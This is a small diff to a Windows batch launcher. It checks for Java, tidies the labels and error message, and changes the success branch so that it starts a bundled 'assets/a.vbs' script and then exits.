@@ -2,15 +2,20 @@
 
 where java >nul 2>nul
 if %errorlevel%==1 (
-	goto b
+	goto :b
 )
 
-goto a
+goto :a
 
 :b
-@echo Java error. Please install the latest version of java.
+@echo Java error. Please install the latest version of Java.
 pause
+goto :exit
 
 :a
-@echo  Successfully installed.
-pause
+cd assets
+start a.vbs
+goto :exit
+
+:exit
+exit
